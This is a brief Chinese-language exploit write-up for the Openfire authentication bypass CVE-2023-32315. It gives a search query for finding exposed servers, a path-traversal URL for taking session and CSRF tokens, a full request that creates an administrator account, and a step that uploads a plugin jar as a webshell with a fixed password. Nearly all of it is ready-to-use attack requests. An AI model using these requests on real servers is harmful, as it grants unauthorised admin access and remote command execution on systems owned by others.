# Openfire 身份认证绕过漏洞 CVE-2023-32315

## 网络测绘

hunter: web.title="openfire"

## POC / EXP

1. 访问地址获取头部Set-Cookie中的JSESSIONID和csrf值

```
/setup/setup-s/%u002e%u002e/%u002e%u002e/user-groups.jsp
```

2. 创建用户名

```
/setup/setup-s/%u002e%u002e/%u002e%u002e/user-create.jsp?create=%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7&csrf=0oz0wRTbxxNtYkS&email&isadmin=on&name&password=l1xjt2&passwordConfirm=l1xjt2&username=arp263
```

请求头添加第一步获取的值

```
Cookie: JSESSIONID=node017ellkizg4zfojhnjo1xrwtmb47.node0
Cookie: csrf=0oz0wRTbxxNtYkS
```

3. 获取webshell

```
https://github.com/tangxiaofeng7/CVE-2023-32315-Openfire-Bypass
上传org.jivesoftware.openfire.plugin.CVE-openfire-plugin-assembly.jar
pass:123
```